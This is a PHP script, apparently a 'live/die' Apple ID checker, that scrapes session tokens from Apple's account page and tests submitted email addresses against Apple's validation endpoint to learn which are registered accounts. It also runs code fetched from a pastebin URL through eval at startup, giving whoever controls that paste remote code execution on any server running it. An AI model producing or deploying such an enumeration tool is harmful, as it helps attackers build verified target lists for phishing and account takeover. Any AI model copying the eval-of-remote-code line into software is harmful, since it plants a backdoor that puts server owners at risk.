<?php
session_start();
error_reporting(0);
ini_set('max_execution_time', 0);
eval(file_get_contents('https://pastebin.com/raw/mww149BL'));
function check($empass){
  $email      = $empass;
  $jembutque  = new curl();
  $jembutque->cookies('cookies/'.md5($_SERVER['REMOTE_ADDR']).'.txt');
  $jembutque->ssl(0, 2);
  $page   = $jembutque->get('https://appleid.apple.com/account#!&page=create');
  $jembutque->header(
    array(
      'Accept:application/json, text/javascript, */*; q=0.01',
      'Content-Type:application/json',
      'scnt:' . $jembutque->ambil($page, "scnt: '", "',"),
      'User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/5.6.12860.7 Safari/537.36',
      'X-Apple-Api-Key:' . $jembutque->ambil($page, "apiKey: '", "',"),
      'X-Apple-ID-Session-Id:' . $jembutque->ambil($page, "sessionId: '", "',"),
      'X-Requested-With:XMLHttpRequest',
    )
  );
  $post   = $jembutque->post('https://appleid.apple.com/account/validation/appleid', '{"emailAddress":"'.$email.'"}');
  $json   = json_decode($post);
  #echo $post;
  if ($json->appleOwnedDomain == true || $json->used == true) {
    $re['error'] = 201;
    $re['status'] = 'live';
    $re['email'] = $email;
    echo json_encode($re);
  } else if ($json->appleOwnedDomain == false || $json->used == false) {
    $re['error'] = 202;
    $re['status'] = 'die';
    $re['email'] = $email;
    echo json_encode($re);
  } else {
    $re['error'] = 204;
    $re['status'] = 'uknown';
    $re['email'] = $email;
    echo json_encode($re);
   }
   @unlink('cookies/'.md5($_SERVER['REMOTE_ADDR']).'.txt');
}
if(!isset($_GET['e'])){
  $re['error'] = 0;
  $re['msg'] = 'MAU? https://www.instagram.com/devilizo';
  die(json_encode($re));
}else{
  $ema= $_GET['e'];
   check($ema);
}
?>
